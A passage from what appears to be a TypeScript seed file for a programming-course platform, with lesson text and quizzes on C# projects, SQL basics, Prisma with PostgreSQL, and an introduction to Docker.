      `Time to combine classes, collections, and LINQ into a real console application.\n\n## Requirements\n\n1. Create a \`Student\` class with a name and a list of scores.\n2. Store several students in a \`List<Student>\`.\n3. Write a method that computes a student's average score.\n4. Use LINQ (\`Where\`, \`Select\`, or similar) to filter and report which students are passing (e.g. average \`>= 70\`).\n5. Loop over every student and print a report line with their name, average, and a letter grade (A/B/C/D/F) based on thresholds you define.\n\n## Stretch goals\n\n- Read student data from \`Console.ReadLine()\` instead of hardcoding it.\n- Sort students by average score, highest first.\n- Wrap score parsing in a \`try/catch\` to handle invalid input gracefully.\n\nSubmit your repository link below when you are done, an instructor will review it before you can mark this lesson complete. Good luck! 🚀`
    ),
    requiresSubmission: true,
  },
];

const sqlLessons: SeedLesson[] = [
  {
    title: 'Introduction to SQL and SELECT',
    content: lessonContent(
      'Introduction to SQL and SELECT',
      `SQL (Structured Query Language) is how you talk to a **relational database**, data organized into tables made of rows and columns. Almost every application with a database uses SQL under the hood.\n\nImagine a \`students\` table:\n\n| id | name | xp |\n|----|------|-----|\n| 1 | Ada | 120 |\n| 2 | Grace | 95 |\n| 3 | Alan | 60 |\n\n## Selecting data\n\n\`\`\`sql\nSELECT name, xp\nFROM students;\n\nSELECT *\nFROM students;\n\`\`\`\n\n- \`SELECT\` lists the columns you want back, or \`*\` for every column.\n- \`FROM\` says which table to read from.\n- Every statement ends with a semicolon \`;\`.\n\n> [!NOTE]\n> SQL keywords like \`SELECT\` and \`FROM\` aren't case-sensitive (\`select\` works too), but writing them in \`UPPERCASE\` is the near-universal convention, it makes queries easier to scan.`
    ),
    quiz: {
      title: 'SQL Basics Quiz',
      passingScore: 70,
      questions: [
        {
          type: 'MULTIPLE_CHOICE',
          prompt: 'What does SQL stand for?',
          options: ['Structured Query Language', 'Sequential Query Logic', 'System Query Layer', 'Structured Question Language'],
          answer: 'Structured Query Language',
        },
        {
          type: 'FILL_BLANK',
          prompt: 'The ____ clause specifies which table a query reads from.',
          options: [],
          answer: 'FROM',
        },
        {
          type: 'TRUE_FALSE',
          prompt: 'SQL keywords like SELECT and FROM are not case-sensitive.',
          options: ['True', 'False'],
          answer: 'True',
        },
      ],
    },
  },
  {
    title: 'Filtering with WHERE',
    content: lessonContent(
      'Filtering with WHERE',
      `\`\`\`sql\nSELECT name, xp\nFROM students\nWHERE xp >= 100;\n\nSELECT name\nFROM students\nWHERE name LIKE 'A%';\n\`\`\`\n\n## Comparisons and patterns\n\n- \`WHERE\` filters rows before they're returned, only rows where the condition is true make it into the result.\n- \`LIKE 'A%'\` matches names starting with \`A\`, \`%\` is a wildcard for "anything, any length".\n- Combine conditions with \`AND\` / \`OR\`, and control the result order with \`ORDER BY\`:\n\n\`\`\`sql\nSELECT name, xp\nFROM students\nWHERE xp >= 50 AND name != 'Ada'\nORDER BY xp DESC;\n\`\`\`\n\n\`ORDER BY xp DESC\` sorts highest-XP first, drop \`DESC\` (or use \`ASC\`) to sort lowest first.`
    ),
    quiz: {
      title: 'WHERE Clause Quiz',
      passingScore: 70,
      questions: [
        {
          type: 'MULTIPLE_CHOICE',
          prompt: 'Which keyword matches a text pattern like a prefix or suffix?',
          options: ['MATCH', 'LIKE', 'HAS', 'IN'],
          answer: 'LIKE',
        },
        {
          type: 'FILL_BLANK',
          prompt: 'To sort query results from highest to lowest, you add ORDER BY column ____.',
          options: [],
          answer: 'DESC',
        },
        {
          type: 'TRUE_FALSE',
          prompt: 'The WHERE clause filters rows before they are included in the result set.',
          options: ['True', 'False'],
          answer: 'True',
        },
      ],
    },
  },
  {
    title: 'Joining Tables',
    content: lessonContent(
      'Joining Tables',
      `Relational databases spread data across multiple tables, a \`JOIN\` combines rows from two tables based on a shared column.\n\nGiven \`students(id, name)\` and \`enrollments(student_id, course_title)\`:\n\n\`\`\`sql\nSELECT students.name, enrollments.course_title\nFROM students\nJOIN enrollments ON students.id = enrollments.student_id;\n\`\`\`\n\n\`ON students.id = enrollments.student_id\` tells the database how to match rows between the two tables.\n\n## INNER JOIN vs. LEFT JOIN\n\n- A plain \`JOIN\` (short for \`INNER JOIN\`) only returns rows that have a match in **both** tables.\n- A \`LEFT JOIN\` keeps every row from the left (first) table, filling in \`NULL\` for columns from the right table when there's no match, useful for finding students with **zero** enrollments.\n\n\`\`\`sql\nSELECT students.name, enrollments.course_title\nFROM students\nLEFT JOIN enrollments ON students.id = enrollments.student_id;\n\`\`\``
    ),
    quiz: {
      title: 'Joins Quiz',
      passingScore: 70,
      questions: [
        {
          type: 'MULTIPLE_CHOICE',
          prompt: 'What does a JOIN need in order to combine rows from two tables?',
          options: ['A shared, matching column', 'Identical column names everywhere', 'The same number of rows in each table', 'Nothing extra'],
          answer: 'A shared, matching column',
        },
        {
          type: 'FILL_BLANK',
          prompt: 'A ____ JOIN keeps every row from the left table even when there is no match, filling in NULLs.',
          options: [],
          answer: 'LEFT',
        },
        {
          type: 'TRUE_FALSE',
          prompt: 'An INNER JOIN only returns rows that have a match in both tables.',
          options: ['True', 'False'],
          answer: 'True',
        },
      ],
    },
  },
  {
    title: 'Aggregating with GROUP BY',
    content: lessonContent(
      'Aggregating with GROUP BY',
      `**Aggregate functions** summarize many rows into one value, \`COUNT\`, \`SUM\`, \`AVG\`, \`MIN\`, \`MAX\`. \`GROUP BY\` buckets rows before aggregating.\n\n\`\`\`sql\nSELECT course_title, COUNT(*) AS student_count\nFROM enrollments\nGROUP BY course_title;\n\`\`\`\n\nThis counts how many enrollment rows exist per \`course_title\`, one summary row per group.\n\n## Filtering groups with HAVING\n\n\`WHERE\` filters individual rows **before** grouping, \`HAVING\` filters the grouped results **after** aggregating:\n\n\`\`\`sql\nSELECT course_title, AVG(xp) AS average_xp\nFROM enrollments\nJOIN students ON students.id = enrollments.student_id\nGROUP BY course_title\nHAVING AVG(xp) > 50;\n\`\`\`\n\nYou can't write \`WHERE AVG(xp) > 50\`, the average doesn't exist yet at the point \`WHERE\` runs, that's exactly what \`HAVING\` is for.`
    ),
    quiz: {
      title: 'Aggregation Quiz',
      passingScore: 70,
      questions: [
        {
          type: 'MULTIPLE_CHOICE',
          prompt: 'Which clause filters groups after aggregation, where WHERE cannot be used?',
          options: ['WHERE', 'HAVING', 'FILTER', 'GROUP'],
          answer: 'HAVING',
        },
        {
          type: 'FILL_BLANK',
          prompt: 'COUNT(*) counts the number of ____ in each group.',
          options: [],
          answer: 'rows',
        },
        {
          type: 'TRUE_FALSE',
          prompt: 'You can filter on an aggregate result like COUNT(*) using a plain WHERE clause.',
          options: ['True', 'False'],
          answer: 'False',
        },
      ],
    },
  },
  {
    title: 'Modifying Data: INSERT, UPDATE, DELETE',
    content: lessonContent(
      'Modifying Data: INSERT, UPDATE, DELETE',
      `So far every example has only read data. These three statements change it.\n\n\`\`\`sql\nINSERT INTO students (name, xp)\nVALUES ('Grace', 0);\n\nUPDATE students\nSET xp = xp + 25\nWHERE name = 'Grace';\n\nDELETE FROM students\nWHERE xp = 0 AND name = 'Inactive User';\n\`\`\`\n\n- \`INSERT INTO table (columns) VALUES (...)\` adds a new row.\n- \`UPDATE table SET column = value WHERE ...\` modifies existing rows that match the condition.\n- \`DELETE FROM table WHERE ...\` removes matching rows.\n\n> [!WARNING]\n> \`UPDATE\` and \`DELETE\` without a \`WHERE\` clause apply to **every row in the table**. Forgetting the \`WHERE\` is one of the most common, and most costly, mistakes in SQL, always double-check it before running either statement.`
    ),
    quiz: {
      title: 'Modifying Data Quiz',
      passingScore: 70,
      questions: [
        {
          type: 'MULTIPLE_CHOICE',
          prompt: 'Which statement adds a brand-new row to a table?',
          options: ['UPDATE', 'INSERT', 'CREATE', 'ADD'],
          answer: 'INSERT',
        },
        {
          type: 'FILL_BLANK',
          prompt: 'Running UPDATE students SET xp = 0 without a ____ clause would reset every row.',
          options: [],
          answer: 'WHERE',
        },
        {
          type: 'TRUE_FALSE',
          prompt: 'Forgetting the WHERE clause on an UPDATE or DELETE is a common and costly mistake.',
          options: ['True', 'False'],
          answer: 'True',
        },
      ],
    },
  },
  {
    title: 'Final Project: Query a Mini Course Catalog',
    content: lessonContent(
      'Final Project: Query a Mini Course Catalog',
      `Time to combine everything into a set of real queries against a small schema of your own design, with tables like \`students(id, name, xp)\`, \`courses(id, title)\`, and \`enrollments(student_id, course_id)\`.\n\n## Requirements\n\n1. Write a \`SELECT\` with a \`WHERE\` clause that lists all students above a given XP threshold.\n2. Write a query that \`JOIN\`s students and enrollments (and courses) to show which courses each student is taking.\n3. Write a query using \`GROUP BY\` and \`COUNT\` to show how many students are enrolled in each course.\n4. Write an \`UPDATE\` statement that safely modifies a specific row, with a \`WHERE\` clause.\n5. Write an \`INSERT\` statement that adds a new student.\n\n## Stretch goals\n\n- Use a \`LEFT JOIN\` to find students with zero enrollments.\n- Use \`HAVING\` to find courses with more than a set number of students.\n- Add a \`DELETE\` statement (with a safe \`WHERE\` clause!) for removing a dropped enrollment.\n\nSubmit a link to your schema and queries (e.g. a repo or gist) below when you are done, an instructor will review it before you can mark this lesson complete. Good luck! 🚀`
    ),
    requiresSubmission: true,
  },
];

const nodePrismaLessons: SeedLesson[] = [
  {
    title: 'Why Prisma? Connecting Node.js to PostgreSQL',
    content: lessonContent(
      'Why Prisma? Connecting Node.js to PostgreSQL',
      `You've written raw SQL by hand. Now let's connect a real Node.js application to a real PostgreSQL database, and see how **Prisma** makes that connection type-safe and far less error-prone.\n\n## The stack\n\n\`\`\`\nNode.js application\n        │\n        ▼\n  Prisma Client   (generated, type-safe query API)\n        │\n        ▼\n  PostgreSQL database\n\`\`\`\n\nPrisma is an **ORM** (Object-Relational Mapper) for Node.js and TypeScript. You describe your data once, in a schema file, and Prisma generates:\n\n- **Prisma Client**, a fully-typed query API your app calls instead of writing SQL strings by hand.\n- **Migrations**, versioned SQL files that evolve your database schema safely over time.\n\n## Why not just write SQL directly?\n\nYou still can, Prisma Client executes real SQL under the hood. What it adds is:\n\n- **Type safety**, your editor autocompletes column names and catches typos before you ever run the code.\n- **Migrations tracked in version control**, so your team and your database never drift out of sync.\n- Protection against SQL injection by default, since every query is parameterized.\n\n> [!NOTE]\n> Everything you learned in the SQL Fundamentals course still applies, Prisma generates SQL very close to what you'd write by hand, it just does it for you, safely.`
    ),
    quiz: {
      title: 'Prisma Intro Quiz',
      passingScore: 70,
      questions: [
        {
          type: 'MULTIPLE_CHOICE',
          prompt: 'What is Prisma?',
          options: [
            'A PostgreSQL hosting provider',
            'An ORM that generates a type-safe query API and manages migrations',
            'A frontend framework',
            'A replacement for JavaScript',
          ],
          answer: 'An ORM that generates a type-safe query API and manages migrations',
        },
        {
          type: 'FILL_BLANK',
          prompt: 'Prisma Client is generated from a ____ file that describes your data models.',
          options: [],
          answer: 'schema',
        },
        {
          type: 'TRUE_FALSE',
          prompt: 'Prisma Client still executes real SQL against the database under the hood.',
          options: ['True', 'False'],
          answer: 'True',
        },
      ],
    },
  },
  {
    title: 'Setting Up PostgreSQL and a Prisma Project',
    content: lessonContent(
      'Setting Up PostgreSQL and a Prisma Project',
      `## 1. Get a PostgreSQL database running\n\nLocally (via Docker) or a hosted free tier both work, either way you end up with a **connection string**:\n\n\`\`\`\npostgresql://USER:PASSWORD@HOST:PORT/DATABASE\n\`\`\`\n\n## 2. Create a Node project and install Prisma\n\n\`\`\`bash\nnpm init -y\nnpm install prisma --save-dev\nnpm install @prisma/client\nnpx prisma init\n\`\`\`\n\n\`npx prisma init\` creates:\n\n- \`prisma/schema.prisma\`, where you'll define your data models.\n- \`.env\`, with a \`DATABASE_URL\` placeholder for your connection string.\n\n## 3. Point it at your database\n\n\`\`\`\nDATABASE_URL="postgresql://postgres:secret@localhost:5432/blog_dev?schema=public"\n\`\`\`\n\nPrisma reads \`DATABASE_URL\` from your environment, never hardcode credentials directly in \`schema.prisma\`.`
    ),
    quiz: {
      title: 'Setup Quiz',
      passingScore: 70,
      questions: [
        {
          type: 'MULTIPLE_CHOICE',
          prompt: 'Which command scaffolds a new prisma/schema.prisma file and a .env template?',
          options: ['npx prisma generate', 'npx prisma init', 'npx prisma migrate dev', 'npm install prisma'],
          answer: 'npx prisma init',
        },
        {
          type: 'FILL_BLANK',
          prompt: 'Prisma reads the database connection string from the environment variable ____.',
          options: [],
          answer: 'DATABASE_URL',
        },
        {
          type: 'TRUE_FALSE',
          prompt: 'Database credentials should be hardcoded directly inside schema.prisma.',
          options: ['True', 'False'],
          answer: 'False',
        },
      ],
    },
  },
  {
    title: 'Defining Your Prisma Schema',
    content: lessonContent(
      'Defining Your Prisma Schema',
      `\`prisma/schema.prisma\` has three parts: a generator, a datasource, and one or more models.\n\n\`\`\`\ngenerator client {\n  provider = "prisma-client-js"\n}\n\ndatasource db {\n  provider = "postgresql"\n  url      = env("DATABASE_URL")\n}\n\nmodel User {\n  id    Int     @id @default(autoincrement())\n  email String  @unique\n  name  String?\n}\n\`\`\`\n\n## Reading a model\n\n- Each field has a name, a type (\`Int\`, \`String\`, \`Boolean\`, \`DateTime\`, ...), and optional attributes.\n- \`@id\` marks the primary key.\n- \`@default(autoincrement())\` lets PostgreSQL assign the next integer automatically, exactly like \`SERIAL\` in raw SQL.\n- \`@unique\` adds a unique constraint, no two users can share an email.\n- A trailing \`?\` (like \`String?\`) makes a field optional, it maps to a nullable column.\n\nEvery model becomes a table, every field becomes a column, this is the same shape of data you already modeled in the SQL Fundamentals course, just described declaratively instead of with \`CREATE TABLE\`.`
    ),
    quiz: {
      title: 'Schema Quiz',
      passingScore: 70,
      questions: [
        {
          type: 'MULTIPLE_CHOICE',
          prompt: 'Which attribute marks a field as the primary key?',
          options: ['@unique', '@primary', '@id', '@key'],
          answer: '@id',
        },
        {
          type: 'FILL_BLANK',
          prompt: 'A field type written with a trailing ____ mark, like String?, is optional in the database.',
          options: [],
          answer: '?',
        },
        {
          type: 'TRUE_FALSE',
          prompt: 'Every model block in schema.prisma becomes a table in the database.',
          options: ['True', 'False'],
          answer: 'True',
        },
      ],
    },
  },
  {
    title: 'Migrations with Prisma Migrate',
    content: lessonContent(
      'Migrations with Prisma Migrate',
      `A **migration** is a versioned, applied change to your database schema. Prisma Migrate generates and runs the SQL for you, based on the differences it sees in \`schema.prisma\`.\n\n\`\`\`bash\nnpx prisma migrate dev --name init\n\`\`\`\n\nThis command:\n\n1. Compares your schema to the database's current state.\n2. Generates a plain SQL migration file (you can open and read it, it's just \`CREATE TABLE\`, \`ALTER TABLE\`, and so on).\n3. Applies it to your database.\n4. Regenerates Prisma Client so your code's types match the new schema.\n\nEach migration lives in \`prisma/migrations/<timestamp>_init/migration.sql\`, committed to version control alongside your code, exactly like the rest of your app's history.\n\n## Inspecting your data\n\n\`\`\`bash\nnpx prisma studio\n\`\`\`\n\nOpens a local, visual browser for your database, handy for checking that a migration or query did what you expected.`
    ),
    quiz: {
      title: 'Migrations Quiz',
      passingScore: 70,
      questions: [
        {
          type: 'MULTIPLE_CHOICE',
          prompt: 'What does npx prisma migrate dev generate?',
          options: [
            'A plain SQL migration file that gets applied to the database',
            'A compiled binary',
            'A new PostgreSQL server',
            'A JSON config file only',
          ],
          answer: 'A plain SQL migration file that gets applied to the database',
        },
        {
          type: 'FILL_BLANK',
          prompt: 'npx prisma ____ opens a local, visual browser for your database.',
          options: [],
          answer: 'studio',
        },
        {
          type: 'TRUE_FALSE',
          prompt: 'Prisma migration files are meant to be committed to version control.',
          options: ['True', 'False'],
          answer: 'True',
        },
      ],
    },
  },
  {
    title: 'Prisma Client: Basic CRUD',
    content: lessonContent(
      'Prisma Client: Basic CRUD',
      `Once your schema is migrated, Prisma Client gives you a typed method for every model.\n\n\`\`\`\nimport { PrismaClient } from '@prisma/client';\nconst prisma = new PrismaClient();\n\n// Create\nconst user = await prisma.user.create({\n  data: { email: 'ada@example.com', name: 'Ada' },\n});\n\n// Read\nconst users = await prisma.user.findMany();\nconst one = await prisma.user.findUnique({ where: { id: 1 } });\n\n// Update\nconst updated = await prisma.user.update({\n  where: { id: 1 },\n  data: { name: 'Ada Lovelace' },\n});\n\n// Delete\nawait prisma.user.delete({ where: { id: 1 } });\n\`\`\`\n\n*This needs a running Node.js process connected to a real PostgreSQL database, so it's read-only here, you'll run code exactly like this in the final project.*\n\nNotice the shape: every method takes a single options object (\`where\`, \`data\`, ...), and every method returns a fully-typed result, your editor knows \`user.email\` is a \`string\` without you writing a type annotation anywhere.`
    ),
    quiz: {
      title: 'CRUD Quiz',
      passingScore: 70,
      questions: [
        {
          type: 'MULTIPLE_CHOICE',
          prompt: 'Which Prisma Client method fetches every row that matches optional filters?',
          options: ['findOne', 'findMany', 'getAll', 'selectAll'],
          answer: 'findMany',
        },
        {
          type: 'FILL_BLANK',
          prompt: 'prisma.user.____({ where: { id: 1 } }) fetches a single user by a unique field.',
          options: [],
          answer: 'findUnique',
        },
        {
          type: 'TRUE_FALSE',
          prompt: "Prisma Client's create and update methods return the affected row, fully typed.",
          options: ['True', 'False'],
          answer: 'True',
        },
      ],
    },
  },
  {
    title: 'Filtering, Sorting, and Pagination',
    content: lessonContent(
      'Filtering, Sorting, and Pagination',
      `Prisma Client mirrors the \`WHERE\`, \`ORDER BY\`, and \`LIMIT\`/\`OFFSET\` you already know from SQL, as options on \`findMany\`.\n\n\`\`\`\nconst topPosts = await prisma.post.findMany({\n  where: {\n    published: true,\n    title: { contains: 'Prisma' },\n  },\n  orderBy: { createdAt: 'desc' },\n  skip: 0,\n  take: 10,\n});\n\`\`\`\n\n## Mapping to SQL\n\n| Prisma option | SQL equivalent |\n|---|---|\n| \`where: { published: true }\` | \`WHERE published = true\` |\n| \`orderBy: { createdAt: 'desc' }\` | \`ORDER BY created_at DESC\` |\n| \`take: 10\` | \`LIMIT 10\` |\n| \`skip: 20\` | \`OFFSET 20\` |\n\n\`skip\` + \`take\` together give you **pagination**, page 3 of 10-per-page results is \`skip: 20, take: 10\`.`
    ),
    quiz: {
      title: 'Filtering & Pagination Quiz',
      passingScore: 70,
      questions: [
        {
          type: 'MULTIPLE_CHOICE',
          prompt: 'Which Prisma option is equivalent to SQL\'s LIMIT?',
          options: ['skip', 'take', 'limit', 'first'],
          answer: 'take',
        },
        {
          type: 'FILL_BLANK',
          prompt: 'The ____ option in findMany is equivalent to SQL\'s OFFSET.',
          options: [],
          answer: 'skip',
        },
        {
          type: 'TRUE_FALSE',
          prompt: "Prisma's orderBy option maps directly to SQL's ORDER BY clause.",
          options: ['True', 'False'],
          answer: 'True',
        },
      ],
    },
  },
  {
    title: 'Modeling Relations: One-to-Many and Many-to-Many',
    content: lessonContent(
      'Modeling Relations: One-to-Many and Many-to-Many',
      `Just like the \`JOIN\`s you wrote in SQL, Prisma models real relationships between tables, but you declare them once in the schema.\n\n## One-to-many\n\nOne \`User\` can have many \`Post\`s:\n\n\`\`\`\nmodel User {\n  id    Int    @id @default(autoincrement())\n  email String @unique\n  posts Post[]\n}\n\nmodel Post {\n  id       Int    @id @default(autoincrement())\n  title    String\n  authorId Int\n  author   User   @relation(fields: [authorId], references: [id])\n}\n\`\`\`\n\n\`authorId\` is a real foreign-key column, \`author\`/\`posts\` are the Prisma-side relation fields you query through.\n\n## Many-to-many\n\nA \`Post\` can have many \`Tag\`s, and a \`Tag\` can apply to many \`Post\`s:\n\n\`\`\`\nmodel Post {\n  id    Int   @id @default(autoincrement())\n  title String\n  tags  Tag[]\n}\n\nmodel Tag {\n  id    Int    @id @default(autoincrement())\n  name  String @unique\n  posts Post[]\n}\n\`\`\`\n\nPrisma automatically creates and manages the hidden join table behind the scenes, the same \`_PostToTag\` style table you'd have written by hand in SQL.`
    ),
    quiz: {
      title: 'Relations Quiz',
      passingScore: 70,
      questions: [
        {
          type: 'MULTIPLE_CHOICE',
          prompt: 'In a one-to-many relation, which side holds the actual foreign-key column?',
          options: ['The "many" side (e.g. Post.authorId)', 'The "one" side (e.g. User)', 'Neither, Prisma stores it separately', 'Both sides equally'],
          answer: 'The "many" side (e.g. Post.authorId)',
        },
        {
          type: 'FILL_BLANK',
          prompt: 'A many-to-many relation like Post.tags and Tag.posts is backed by a hidden ____ table.',
          options: [],
          answer: 'join',
        },
        {
          type: 'TRUE_FALSE',
          prompt: 'For an implicit many-to-many relation, you must manually create the join table yourself.',
          options: ['True', 'False'],
          answer: 'False',
        },
      ],
    },
  },
  {
    title: 'Querying Relations with include and select',
    content: lessonContent(
      'Querying Relations with include and select',
      `By default, Prisma Client only returns a model's own columns, related data has to be requested explicitly.\n\n\`\`\`\n// Fetch a user together with their posts\nconst userWithPosts = await prisma.user.findUnique({\n  where: { id: 1 },\n  include: { posts: true },\n});\n\n// Shape exactly which fields come back\nconst summaries = await prisma.post.findMany({\n  select: {\n    title: true,\n    author: { select: { name: true } },\n  },\n});\n\n// Create a user and their first post in one call\nconst newUser = await prisma.user.create({\n  data: {\n    email: 'grace@example.com',\n    name: 'Grace',\n    posts: { create: [{ title: 'Hello, Prisma!' }] },\n  },\n});\n\`\`\`\n\n\`include\` adds related records on top of all normal fields, \`select\` replaces the default fields entirely, letting you return only what you need. A **nested write** like the \`posts: { create: [...] }\` above creates both rows in a single call.`
    ),
    quiz: {
      title: 'Include & Select Quiz',
      passingScore: 70,
      questions: [
        {
          type: 'MULTIPLE_CHOICE',
          prompt: 'What does the include option do?',
          options: [
            'Replaces all fields with only the ones listed',
            'Adds related records on top of the normal fields',
            'Deletes unrelated records',
            'Renames columns',
          ],
          answer: 'Adds related records on top of the normal fields',
        },
        {
          type: 'FILL_BLANK',
          prompt: 'Creating a user and a related post in a single call, via posts: { create: [...] }, is called a nested ____.',
          options: [],
          answer: 'write',
        },
        {
          type: 'TRUE_FALSE',
          prompt: 'By default, Prisma Client automatically includes every related model on every query.',
          options: ['True', 'False'],
          answer: 'False',
        },
      ],
    },
  },
  {
    title: 'Transactions and Data Integrity',
    content: lessonContent(
      'Transactions and Data Integrity',
      `Some operations only make sense together. If you move XP from one account to another, both the debit and the credit must succeed, or neither should.\n\n## Batch transactions\n\n\`\`\`\nconst [fromAccount, toAccount] = await prisma.$transaction([\n  prisma.account.update({ where: { id: 1 }, data: { xp: { decrement: 50 } } }),\n  prisma.account.update({ where: { id: 2 }, data: { xp: { increment: 50 } } }),\n]);\n\`\`\`\n\nIf either update fails, PostgreSQL rolls back both, your data never ends up half-changed.\n\n## Interactive transactions\n\nFor logic that needs to check something in between steps, pass a function instead:\n\n\`\`\`\nawait prisma.$transaction(async (tx) => {\n  const from = await tx.account.findUniqueOrThrow({ where: { id: 1 } });\n  if (from.xp < 50) throw new Error('Insufficient XP');\n\n  await tx.account.update({ where: { id: 1 }, data: { xp: { decrement: 50 } } });\n  await tx.account.update({ where: { id: 2 }, data: { xp: { increment: 50 } } });\n});\n\`\`\`\n\nThrowing anywhere inside the callback rolls back every query that already ran in that transaction.`
    ),
    quiz: {
      title: 'Transactions Quiz',
      passingScore: 70,
      questions: [
        {
          type: 'MULTIPLE_CHOICE',
          prompt: 'What happens if one query inside a prisma.$transaction([...]) call fails?',
          options: [
            'Only that query is skipped, the rest still commit',
            'All queries in the transaction are rolled back',
            'The database is deleted',
            'Nothing, errors inside transactions are ignored',
          ],
          answer: 'All queries in the transaction are rolled back',
        },
        {
          type: 'FILL_BLANK',
          prompt: 'Throwing an error inside an interactive $transaction callback function ____ every query that already ran in it.',
          options: [],
          answer: 'rolls back',
        },
        {
          type: 'TRUE_FALSE',
          prompt: 'Transactions guarantee that a group of related writes either all succeed or all fail together.',
          options: ['True', 'False'],
          answer: 'True',
        },
      ],
    },
  },
  {
    title: 'Building a REST API with Express and Prisma',
    content: lessonContent(
      'Building a REST API with Express and Prisma',
      `Wiring Prisma into an Express route handler looks almost exactly like the CRUD calls from earlier, just inside a request handler.\n\n\`\`\`\nimport express from 'express';\nimport { PrismaClient } from '@prisma/client';\n\nconst app = express();\nconst prisma = new PrismaClient();\napp.use(express.json());\n\napp.get('/api/posts', async (req, res) => {\n  const posts = await prisma.post.findMany({\n    where: { published: true },\n    include: { author: { select: { name: true } } },\n    orderBy: { createdAt: 'desc' },\n  });\n  res.json(posts);\n});\n\napp.post('/api/posts', async (req, res) => {\n  try {\n    const post = await prisma.post.create({ data: req.body });\n    res.status(201).json(post);\n  } catch (err) {\n    res.status(400).json({ error: 'Could not create post' });\n  }\n});\n\napp.listen(4000);\n\`\`\`\n\nOne \`PrismaClient\` instance is created once and reused across every request, creating a new one per request would open far too many database connections.`
    ),
    quiz: {
      title: 'Express + Prisma Quiz',
      passingScore: 70,
      questions: [
        {
          type: 'MULTIPLE_CHOICE',
          prompt: 'How many PrismaClient instances should a typical Express app create?',
          options: ['One per request', 'One, reused across every request', 'One per database table', 'It does not matter'],
          answer: 'One, reused across every request',
        },
        {
          type: 'FILL_BLANK',
          prompt: 'Wrapping a Prisma call in try/catch inside a route handler lets you return a proper error ____ code instead of crashing.',
          options: [],
          answer: 'status',
        },
        {
          type: 'TRUE_FALSE',
          prompt: 'Prisma Client calls inside an Express route handler must be awaited, just like anywhere else.',
          options: ['True', 'False'],
          answer: 'True',
        },
      ],
    },
  },
  {
    title: 'Seeding and Testing Your Database',
    content: lessonContent(
      'Seeding and Testing Your Database',
      `A **seed script** fills a fresh database with starter data, so you (and your teammates) aren't testing against an empty database every time.\n\n\`\`\`\n// prisma/seed.ts\nimport { PrismaClient } from '@prisma/client';\nconst prisma = new PrismaClient();\n\nasync function main() {\n  await prisma.user.create({\n    data: {\n      email: 'ada@example.com',\n      name: 'Ada',\n      posts: { create: [{ title: 'My first post' }] },\n    },\n  });\n}\n\nmain().finally(() => prisma.$disconnect());\n\`\`\`\n\nWire it up in \`package.json\`:\n\n\`\`\`\n{\n  "prisma": {\n    "seed": "tsx prisma/seed.ts"\n  }\n}\n\`\`\`\n\nThen run it with:\n\n\`\`\`bash\nnpx prisma db seed\n\`\`\`\n\n## Resetting during development\n\n\`\`\`bash\nnpx prisma migrate reset\n\`\`\`\n\nDrops your dev database, reapplies every migration from scratch, and reruns your seed script, an easy way to get back to a known, clean state while building.\n\n> [!TIP]\n> This whole platform's own course catalog, including this lesson, is generated by exactly this kind of seed script.`
    ),
    quiz: {
      title: 'Seeding Quiz',
      passingScore: 70,
      questions: [
        {
          type: 'MULTIPLE_CHOICE',
          prompt: 'What is the purpose of a seed script?',
          options: [
            'To back up production data',
            'To fill a fresh database with starter data for development',
            'To compile TypeScript',
            'To generate the Prisma schema',
          ],
          answer: 'To fill a fresh database with starter data for development',
        },
        {
          type: 'FILL_BLANK',
          prompt: 'npx prisma migrate ____ drops the dev database, reapplies migrations, and reruns the seed script.',
          options: [],
          answer: 'reset',
        },
        {
          type: 'TRUE_FALSE',
          prompt: 'A seed script is typically run against a production database with real user data.',
          options: ['True', 'False'],
          answer: 'False',
        },
      ],
    },
  },
  {
    title: 'Final Project: Build a Blog API with Prisma & PostgreSQL',
    content: lessonContent(
      'Final Project: Build a Blog API with Prisma & PostgreSQL',
      `Time to combine everything, schema design, migrations, relations, transactions, and Express, into one real project.\n\n## Requirements\n\n1. Design a \`schema.prisma\` with at least two related models (e.g. \`User\` and \`Post\`, one-to-many).\n2. Generate and run a migration with \`npx prisma migrate dev\` against a real PostgreSQL database.\n3. Build a REST API in Express with full CRUD endpoints for at least one model, backed by Prisma Client.\n4. Implement one list endpoint that supports filtering, sorting, and pagination (\`where\`, \`orderBy\`, \`skip\`/\`take\`).\n5. Use \`prisma.$transaction\` somewhere the logic genuinely requires it (e.g. an operation that touches two related records atomically).\n6. Write a \`prisma/seed.ts\` script that populates a few starter rows.\n\n## Stretch goals\n\n- Add a many-to-many relation (e.g. tags on posts) and an endpoint that filters by tag.\n- Return pagination metadata (total count, page number) alongside the results.\n- Write at least one automated test for an endpoint.\n\nSubmit your repository link below when you are done, an instructor will review it before you can mark this lesson complete. Good luck! 🚀`
    ),
    requiresSubmission: true,
  },
];

const dockerLessons: SeedLesson[] = [
  {
    title: 'Why Docker? Containers vs. Virtual Machines',
    content: lessonContent(
      'Why Docker? Containers vs. Virtual Machines',
      `"It works on my machine" is one of the oldest problems in software. **Docker** solves it by packaging an application together with everything it needs to run, code, runtime, libraries, system tools, into a single **container** that behaves the same everywhere.\n\n## Containers vs. virtual machines\n\n| | Virtual Machine | Container |\n|---|---|---|\n| Includes | A full guest operating system | Just the app and its dependencies |\n| Startup time | Minutes | Seconds |\n| Size | Gigabytes | Often megabytes |\n| Isolation | Full hardware-level virtualization | Shares the host OS kernel, isolated processes |\n\nContainers are lighter because they don't boot a whole separate operating system, they share the host machine's kernel but keep everything else (filesystem, processes, network) isolated.\n\n## Images vs. containers\n\n- An **image** is a read-only template, the blueprint (think: a class).\n- A **container** is a running instance of an image (think: an object). You can start many containers from the same image.\n\n> [!NOTE]\n> Docker Desktop (or Docker Engine on Linux) is the tool that builds images and runs containers. Install it before the next lesson.`
    ),
    quiz: {
      title: 'Containers Quiz',
      passingScore: 70,
      questions: [
        {
          type: 'MULTIPLE_CHOICE',
          prompt: 'What do containers share with the host machine that virtual machines do not?',
          options: ['The filesystem', 'The kernel', 'The network', 'Nothing, they are identical to VMs'],
          answer: 'The kernel',
        },
        {
          type: 'FILL_BLANK',
          prompt: 'A Docker ____ is the read-only template that containers are started from.',
          options: [],
          answer: 'image',
        },
        {
          type: 'TRUE_FALSE',
          prompt: 'You can run multiple containers from the same image at the same time.',
          options: ['True', 'False'],
          answer: 'True',
        },
      ],
    },
  },
  {
    title: 'Your First Docker Container',
    content: lessonContent(
      'Your First Docker Container',
